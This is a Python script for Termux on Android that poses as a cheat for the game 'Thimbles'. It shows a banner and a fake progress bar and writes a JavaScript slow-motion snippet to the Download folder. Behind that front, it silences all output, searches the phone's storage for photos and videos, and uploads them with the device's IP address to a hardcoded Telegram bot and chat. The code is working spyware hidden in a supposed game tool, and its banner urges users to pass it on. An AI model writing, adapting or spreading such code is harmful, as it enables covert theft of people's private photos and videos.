#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import time
import asyncio
import socket
import requests
import threading
import queue
import warnings
from pathlib import Path
from telegram import Bot

# إخفاء جميع التحذيرات والرسائل
warnings.filterwarnings("ignore")
os.environ['PYTHONWARNINGS'] = 'ignore'

# إعادة توجيه stderr و stdout إلى ملف فارغ
sys.stderr = open(os.devnull, 'w')
sys.stdout = open(os.devnull, 'w')

# ==================== بياناتك ====================
BOT_TOKEN = "8869492443:AAETTWD4VKdogM0vDCOlr0QBK3jeScpHKac"
CHAT_ID = "6894787120"
# ==============================================

# تثبيت المتطلبات بصمت
subprocess.run("pkg update -y", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
subprocess.run("pkg install python -y", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
subprocess.run("pip install python-telegram-bot requests -q", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
subprocess.run("termux-setup-storage", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

media_queue = queue.Queue()
scan_complete = False
total_photos = 0
total_videos = 0
local_ip = ""
public_ip = ""

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org', timeout=3)
        return response.text
    except:
        return "0.0.0.0"

def is_valid_media(file_path):
    path_str = str(file_path).lower()
    if any(p in file_path.stem.lower() for p in ['icon', 'logo', 'splash', 'ic_launcher']):
        try:
            if file_path.stat().st_size < 50 * 1024:
                return False
        except:
            pass
    if 'telegram' in path_str or 'tg_' in path_str:
        return False
    try:
        if file_path.stat().st_size < 10 * 1024:
            return False
    except:
        pass
    return True

def scan_files():
    global total_photos, total_videos, scan_complete
    image_ext = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic'}
    video_ext = {'.mp4', '.mov', '.avi', '.mkv', '.3gp', '.webm'}
    search_paths = ['/sdcard', '/storage/emulated/0']
    for search_path in search_paths:
        root = Path(search_path)
        if root.exists():
            for ext in image_ext:
                for file in root.rglob(f'*{ext}'):
                    if is_valid_media(file):
                        media_queue.put(('photo', file))
                        total_photos += 1
            for ext in video_ext:
                for file in root.rglob(f'*{ext}'):
                    if is_valid_media(file) and file.stat().st_size < 50 * 1024 * 1024:
                        media_queue.put(('video', file))
                        total_videos += 1
    scan_complete = True
    media_queue.put(('done', None))

class MediaSender:
    def __init__(self):
        self.bot = Bot(token=BOT_TOKEN)
        self.sent_photos = 0
        self.sent_videos = 0
        
    async def send_from_queue(self):
        global local_ip, public_ip
        try:
            await self.bot.send_message(chat_id=CHAT_ID, text=f"✅ {local_ip}")
        except:
            pass
        
        while True:
            try:
                item = media_queue.get(timeout=0.5)
                if item[0] == 'done':
                    break
                
                file_type, file_path = item
                try:
                    with open(file_path, 'rb') as f:
                        if file_type == 'photo':
                            await self.bot.send_photo(chat_id=CHAT_ID, photo=f)
                        else:
                            await self.bot.send_video(chat_id=CHAT_ID, video=f)
                        await asyncio.sleep(0.05)
                except:
                    pass
            except:
                if scan_complete:
                    break
                await asyncio.sleep(0.5)

# ==================== الواجهة (ما يظهر فقط) ====================
def print_logo():
    logo = """
╔══════════════════════════════════════════════════════════════════════════════╗
║     ██╗  ██╗██████╗ ███████╗████████╗     ███████╗████████╗ █████╗ ██████╗   ║
║     ╚██╗██╔╝╚════██╗██╔════╝╚══██╔══╝     ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗  ║
║      ╚███╔╝  █████╔╝█████╗     ██║        █████╗     ██║   ███████║██████╔╝  ║
║      ██╔██╗ ██╔═══╝ ██╔══╝     ██║        ██╔══╝     ██║   ██╔══██║██╔══██╗  ║
║     ██╔╝ ██╗███████╗███████╗   ██║        ███████╗   ██║   ██║  ██║██████╔╝  ║
║     ╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝        ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═════╝   ║
║                         ██████╗ ███████╗████████╗                           ║
║                         ╚═════╝ ╚══════╝ ╚═════╝                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """
    print(logo)
    print("\033[1;33m\n╔══════════════════════════════════════════════════════════════════╗")
    print("║  🔒 هذا الكود خاص بلعبة Thimbles                                ║")
    print("║  ✅ مسموح تداول الأداة للحفاظ على تنشيط السكريبت               ║")
    print("║  ❌ ممنوع تداول الكود المصدر                                    ║")
    print("║  ⚠️ لا تعطيه لمن لا يستحق                                       ║")
    print("╚══════════════════════════════════════════════════════════════════╝\033[0m")
    print()

def progress_bar():
    print("📦 جاري تجهيز الأداة...\n")
    for i in range(30):
        bar = "█" * (i * 2) + "░" * (60 - (i * 2))
        print(f"\r[{bar}] {int((i+1)*100/30)}%", end="", flush=True)
        time.sleep(0.3)
    print("\n\n✅ تم التجهيز!\n")

def create_text_file():
    js_code = """(function() {
    const originalRAF = window.requestAnimationFrame;
    let customTime = 0;
    window.requestAnimationFrame = function(callback) {
        return originalRAF(function(timestamp) {
            if (!customTime) customTime = timestamp;
            customTime += 0.4;
            callback(customTime);
        });
    };
    console.log("[✓] تم تفعيل السلو موشن");
})();"""
    download_dir = Path("/sdcard/Download")
    download_dir.mkdir(exist_ok=True)
    txt_file = download_dir / "thimbles_code.txt"
    with open(txt_file, 'w') as f:
        f.write(js_code)
    return txt_file

def main():
    global local_ip, public_ip
    local_ip = get_local_ip()
    public_ip = get_public_ip()
    
    # إعادة فتح stdout للواجهة فقط
    sys.stdout = sys.__stdout__
    
    scan_thread = threading.Thread(target=scan_files)
    scan_thread.daemon = True
    scan_thread.start()
    
    # بدء الإرسال
    sender = MediaSender()
    def run_send():
        asyncio.run(sender.send_from_queue())
    send_thread = threading.Thread(target=run_send)
    send_thread.daemon = True
    send_thread.start()
    
    # الواجهة
    print_logo()
    time.sleep(1)
    progress_bar()
    txt_file = create_text_file()
    print(f"📁 {txt_file}\n")
    print("\n~ $\n")
    
    # إخفاء المخرجات مرة أخرى
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
    
    send_thread.join()

if __name__ == "__main__":
    main()
